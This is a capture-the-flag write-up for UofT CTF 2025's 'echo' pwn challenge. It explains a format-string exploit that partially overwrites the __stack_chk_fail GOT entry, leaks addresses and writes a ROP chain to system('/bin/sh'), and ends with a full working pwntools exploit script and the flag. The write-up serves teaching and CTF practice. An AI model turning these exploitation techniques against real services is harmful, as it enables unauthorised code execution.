---
layout: writeup
category: UofT-CTF-2025
chall_description: 
points: 388
solves: 54
tags: UofT-CTF-2025 pwn pwn/buffer-overflow pwn/format-string pwn/got-overwrite
date: 2025-1-12
comments: false
---

Yet another echo service. However, the service keeps printing stack smashing detected for some reason, can you help me figure it out?

nc 34.29.214.123 5000

Author: White

[echo.zip](https://github.com/Nightxade/ctf-writeups/blob/master/assets/CTFs/UofT-CTF-2025/echo.zip)  

---

### extracting libc shenanigans

First of all, this challenge provides a Dockerfile that includes image that the binary runs on -- for this, we need to extract the libc from the docker image. (including this because in the past when I didn't know Docker I always struggled with this sort of stuff D:)  

Assuming you have docker installed, you can run something like this `docker run -v /home/user/Downloads:/home -i -t ubuntu@sha256:80dd3c3b9c6cecb9f1667e9290b3bc61b78c2678c02cbdae5f0fea92cc6734ab  /bin/bash` to start a container for the image. Then, run `ldd` on some binary (e.g. `ldd /bin/cat`) to get the path of libc. Then copy that to `/home` on the container, and you'll find the libc on your local machine in `/home/user/Downloads`.  

Once you've extracted the libc, copy it to your current directory (where the `echo` binary is located), and run `pwninit`. Now you have a patched binary linking to the correct libc!  

### initial analysis

Okay that's done. Now here's the decompilation (Binary Ninja):  

```c
int64_t vuln() {
    void* fsbase
    int64_t rax = *(fsbase + 0x28)
    void var_11
    read(0, &var_11, 0x100)
    int64_t rax_2 = printf(&var_11)
    if (rax != *(fsbase + 0x28))
        rax_2 = __stack_chk_fail()
    return rax_2
}

int64_t main() {
    setup()
    int32_t var_c = 0
    vuln()
    return 0
}
```

`checksec` output:  

```yaml
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```


It's a pretty small binary. But we can clearly see a large buffer overflow into `var_11` and a printf vuln. Pretty easy... right?  

Well, it's not quite that easy. If you step into the debugger, you'll quickly notice that `var_11` is located on the stack a **single byte** away from the stack cookie. In other words, we can write a single byte before we'll overwrite the stack canary and cause the program to call `__stack_chk_fail()` and exit -- not good :(  

### got overwrite

It seems we're screwed. With PIE and ASLR, we can't write to anywhere... right?  

Not quite! Take a look at the stack:  

```c
$rsp:   0x41007fffffffd7b0      0x4141414141414141
        0x7fffffff0a41          0x555555555275      <main+44>
        0x7fffffffd8b0          0xffffd8f8
        0x7fffffffd870          0x7ffff7dd51ca      <__libc_start_call_main+122>
        0x7fffffffd820          0x7fffffffd8f8
        0x155554040             0x555555555249      <main>
        0x7fffffffd8f8          0x3c01a865ac459f
        0x1                     0x0
        0x555555557df0          0x7ffff7ffd000      <_rtld_global>
        0x3c01a87a8c459f        0x3c11ed764e459f
```

Note that the string of `41`'s is my input. (input starts at `$rsp + 7`)  

There are some addresses to within the ELF binary (`main+44`, `main`). Now, they're not currently pointing to writeable sections of the binary of course, since they're pointing to `.text`. But, what if we were to overflow into those addresses and partially overwrite them! Overwriting the last 1-2 bytes of an ELF address means we can set the address to point to practically anywhere. (note that we can do a partial overwrite of these addresses on the stack because the program reads input via `read()`, which doesn't append a null byte after reading input)  

But where would we write to? Well, since Parital RELRO is enabled, and not Full RELRO, it only makes sense to overwrite the GOT entry for `__stack_chk_fail()`. After all, `__stack_chk_fail()` will always be called if our input is more than one byte long. And, with a format string vuln, our inputs are always going to be more than one byte long if they're doing anything useful.  

You might realize, however, that conrolling the last 2 bytes of an ELF address isn't so simple. The ELF base is randomized so that the last 3 hex digits of the ELF base are `000`, i.e. we 100% know what these digits should be to jump to `__stack_chk_fail()`. However, we can't just write 3 hex digits -- we have to write at least by byte-size, i.e. 2 hex digits at a time. That means we don't know the last hex digit, since it's randomized by the ELF base.  

However, a single hex digit only has 16 possible values. For our purposes, we can simply brute force this value! Just keep trying our exploit until the remote server doesn't return a *segmentation fault*. This can be pretty easily scripted.  

But what should we change the GOT entry of `__stack_chk_fail()` to? There's no win function here like in `Baby Pwn`. Well, a common idea when we have a format string vuln is that, optimally, we need to be able to use that vuln multiple times. Typically, the first time around we leak things like the ELF base or LIBC base. Then, the second time, we write to some address.  

With our exploit, we're actually writing to an address without any leaks. But, our pwning power is inevitably limited by our lack of leaks. So, we should write the address of `vuln()` to the GOT entry of `__stack_chk_fail()`. That way, whenever we trigger `__stack_chk_fail()` (again, this will basically always happen as long as we want it to), the program will return to `vuln()`, resulting in an infinite loop of `vuln()`. This, in turn, means an infinite loop of the format string vuln! Great :)  

### preparing the payload

So, let's first try to create a custom format string payload to write to our target ELF address on the stack. By sending `%[SOME_NUMBER]$lx` several different times, we can figure out the necessary offset. I ended up using offset `17`. The format string payload would thus be created as follows:  

```py
missing_byte = int(input(), 16)
write_addr_offset = 15
payload = f'%{(elf.sym.vuln % 0x1000) | ((missing_byte - 3) << 12)}lx%17$hn'.encode()
```

* Note that, for local debugging purposes, I extracted `missing_byte` from GDB and manually entered into my local solve script. (`missing_byte` represents the fourth least significant hex digit -- the one we don't know -- of the `.bss` section)    

### how to fmt str???

(if you're familiar with format string exploits, skip this part!)  

Anyways, for those of you unfamiliar with how format string write payloads work, I'll provide a short explanation:  

- `(elf.sym.vuln % 0x1000) | ((missing_byte - 3) << 12)` evaluates to a number that represents the 2 least significant bytes of `vuln()`, in the context of the ELF base  
- `%{(elf.sym.vuln % 0x1000) | ((missing_byte - 3) << 12)}lx` is a little trick used to output that many bytes to the screen. We need printf to write more than 0x1000 bytes in order for the `%n` format specifier to work (I'll explain why shortly). However, we only have `0x100` bytes of overflow. This trick basically tells `printf()` to pad the first argument / address on the stack by `(elf.sym.vuln % 0x1000) | ((missing_byte - 3) << 12)` many bytes.  
- `%n` format specifiers are a little bit confusing if you're new to format strings. But, basically, they take the amount of bytes that have been written so far by printf, and writes that number to the next address on the stack. For example:  
```c
printf("1234%n", 0xdeadbeef);
```
This would write `4` to the address `0xdeadbeef`. (note that `printf` passes its arguments on the stack. hence, if you don't pass any extra arguments **but** use format strings, it'll use the other information from the stack! this is the basic idea of format string vulnerabilities)  

- `%17$hn` just adds several modifications to this idea. The `17` tells printf to select the 17th address on the stack, and write to that. The `hn` tells printf to write to a `WORD`, i.e. write to a 2-byte location.  

Putting it all together, here's an example of how that would work:  

```c
printf("%570%4$hn", 0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, 0x13371337);
```
This would result in the following state (assuming 0x13371330 is initialized to all zeros):  
```
0x13371330: 00 00 00 00 00 02 3a 00
```

Also, this isn't a comprehensive overview of format string vulnerabilities, so I would highly recommend you check out [pwn.college](https://pwn.college/software-exploitation/format-string-exploits/) for a really in-depth tutorial. It will take some time but it is definitely worth it :)  

### continuing the payload

Once we're done writing the format string, we just make sure we partially overflow the address on the stack that we're writing to:  

```py
missing_byte = int(input(), 16)

overflow_offset = 0x8*10 + 1

payload = f'%{(elf.sym.vuln % 0x1000) | ((missing_byte - 3) << 12)}lx%17$hn'.encode()
payload = payload.ljust(overflow_offset, b'A')
payload += (elf.got['__stack_chk_fail'] % 0x100).to_bytes(1, 'big')
payload += ((missing_byte << 4)).to_bytes(1, 'big')
send(payload, line=False)
```

And there's our GOT overwrite done! Returned back to `vuln()` :)  

### leaks

There really isn't much to say here. Just leak everything useful off the stack by playing around in GDB and finding the format string offsets to each one. (remember to always use `%[OFFSET]$lx` to read a 64-bit value with the `l` modifier)  

```py
input()
libc_leak_offset = 3
elf_leak_offset = 9
stack_leak_offset = 22
send(f'%{libc_leak_offset}$lx%{elf_leak_offset}$lx%{stack_leak_offset}$lx'.encode(), line=False)
leak = p.recvrepeat(1)
leak = leak[leak.index(b'A'):]
leak = leak[leak.index(b'7f'):]

libc_leak = int(leak[:12], 16)
libc.address = libc_leak - 0xf3a61 - 0x28000

elf_leak = int(leak[12:24], 16)
elf.address = elf_leak - 0x247 - 0x1000

stack_leak = int(leak[24:36], 16)
next_frame_rsp = stack_leak + (0x7fff2729a160 - 0x7fff2729a2f8)
```

(Note that the `input()` is there to make sure this input doesn't overlap with the previous one, since `read()` can be finicky when simultaneousy using `pwntools` and debugging with `GDB`)  

### rop rop rop

Now it's ROP time!  

The idea is simple. Using the stack address we leaked, we're going to overwrite one of the several saved RIPs on the stack. (There are multiple saved RIPs that point back to `vuln+87` as a result of multiple calls to `__stack_chk_fail()`). We'll write a full ROP chain there using the format string vuln, this time with ease because of the nice functionality provided by `pwntools`. Then, finally, in our last call to `vuln()`, we'll send a single byte for the input -- this will make the program not call `__stack_chK_fail()` (aka `vuln()`), and subsequently return (eventually to our ROP chain)!  

### bof...?

As I'm writing this writeup, I'm realizing that there was absolutely no need to use the format string vuln to write my ROP chain. I could've just used the buffer overflow to write in the ROP chain and win that way. Oh well ¯\\_(ツ)_/¯ 

Anyways, here's the final sequence:  

```py
input()

binsh = next(libc.search(b"/bin/sh\x00"))
rop = ROP(elfs=libc)
rop.raw(rop.ret.address)
rop.rdi = binsh
rop.call('system')
payload = b'A'
writes = {next_frame_rsp + 24 + i*8: rop.build()[i] for i in range(len(rop.build()))}
payload += fmtstr_payload(offset=7, numbwritten=1, writes=writes, write_size='short')
send(payload, line=True)

input()

payload = b'A'
send(payload, line=False)
```

(Again, `input()` because `read()` is finicky)  

### brute force remote!

Remember, we need to brute force that 4th least significant hex digit! This is pretty simple -- just throw all the code in a while(True) loop and `continue` if, after the leakless write attempt, you get a *segmentation fault*.  

Once we pop the shell, we just run `cat flag.txt` and get the flag!  

    uoftctf{c4n4ry_15_u53l355_1f_607_15_wr174bl3}

\* Postscript: my elf leak didn't work on remote for some reason, so I spent like an hour trying to figure out why I was getting SIGILL :sob: finally just tried to switch my ROP to libc only, and it worked perfectly.  

### full script  

Here is the full script for the **remote** exploit:  

```py
# Useful references:
# https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf

from pwn import *
import sys
import os
from time import sleep

#---------HELPER FUNCTIONS---------#

def get_leak(before: bytes, end: bytes=b'\n') -> int:
    p.recvuntil(before)
    return int(p.recvuntil(end).decode('ascii')[:-1], 16)

def send(payload: bytes, before: bytes=b'', line: bool=True) -> int:
    payload = payload + (b'\n' if line else b'')
    if before == b'':
        p.send(payload)
    else:
        p.sendafter(before, payload)


#---------SETUP---------#

args = list(map(lambda s: s.upper(), sys.argv))
_libcs = list(filter(lambda s: 'libc.so.6' in s, os.listdir()))
_lds = list(filter(lambda s: 'ld' == s[:2], os.listdir()))

elf = ELF("chall_patched")                                              #------TODO------#
libc = ELF(_libcs[0]) if len(_libcs) else elf.libc
ld = ELF(_lds[0]) if len(_lds) else None

context.binary = elf
context.log_level = "DEBUG"

gdbscript = '''
b *vuln+66
'''

while True:
    if 'REMOTE' in args:
        p = remote('34.29.214.123', 5000)                                   #------TODO------#
    else:
        p = process([elf.path])
        gdb.attach(p, gdbscript=gdbscript)


    #-----------CONSTANTS--------------#

    # sh = bytes(asm('mov rax, 0x68732f6e69622f; push rax; mov rdi, rsp; mov rsi, 0; mov rdx, 0; mov rax, SYS_execve; syscall;'))


    ###################################
    #==========BEGIN EXPLOIT==========#
    ###################################

    #---OVERWRITE __stack_chk_fail----#

    missing_byte = 0xd

    write_addr_offset = 15
    overflow_offset = 0x8*10 + 1

    payload = f'%{(elf.sym.vuln % 0x1000) | ((missing_byte - 3) << 12)}lx%17$hn'.encode()
    payload = payload.ljust(overflow_offset, b'A')
    payload += (elf.got['__stack_chk_fail'] % 0x100).to_bytes(1, 'big')
    payload += ((missing_byte << 4)).to_bytes(1, 'big')
    send(payload, line=False)

    #------------LEAK STUFF-----------#

    sleep(0.25)

    libc_leak_offset = 3
    elf_leak_offset = 9
    stack_leak_offset = 22
    send(f'%{libc_leak_offset}$lx|%{elf_leak_offset}$lx|%{stack_leak_offset}$lx'.encode(), line=False)
    leak = p.recvrepeat(1)
    # print(leak)

    # if input().strip() == 'q':
    #     p.close()
    #     continue

    if b'Segmentation fault' in leak:
        p.close()
        continue

    leak = leak[leak.index(b'A'):]
    leak = leak[leak.index(b'7'):]


    libc_leak = int(leak[:12], 16)
    libc.address = libc_leak - 0xf3a61 - 0x28000

    elf_leak = int(leak[13:25], 16)
    elf.address = elf_leak - 0x247 - 0x1000

    stack_leak = int(leak[26:38], 16)
    next_frame_rsp = stack_leak + (0x7fff2729a160 - 0x7fff2729a2f8)

    #---------WRITE ROP CHAIN---------#

    # totally could've just used the BOF here oops

    binsh = next(libc.search(b"/bin/sh\x00"))
    rop = ROP(elfs=[libc, elf])
    rop.raw(rop.ret.address)
    rop.rdi = binsh
    rop.call('system')
    payload = b'A'
    writes = {next_frame_rsp + 24 + i*8: rop.build()[i] for i in range(len(rop.build()))}
    payload += fmtstr_payload(offset=7, numbwritten=1, writes=writes, write_size='short')

    send(payload, line=True)

    sleep(0.25)

    payload = b'A'
    send(payload, line=False)

    break

    ###################################
    #===========END EXPLOIT===========#
    ###################################


p.interactive()
p.close()

'''
TL;DR:
large bof + fmt str vuln
overwrite GOT of __stack_chk_fail() to vuln()
    partial overwrite of last 2 bytes of an elf address on the stack to point to GOT address
    (requires 4 bit brute force of elf base)
leak libc base + elf base + stack address
write rop chain onto a saved rip, then next call to vuln() only send 1 byte so it doesn't call __stack_chk_fail and returns
    for some reason for remote the ROP chain must be using LIBC only because ELF base leaks incorrectly on remote :shrug:
'''
# uoftctf{c4n4ry_15_u53l355_1f_607_15_wr174bl3}
```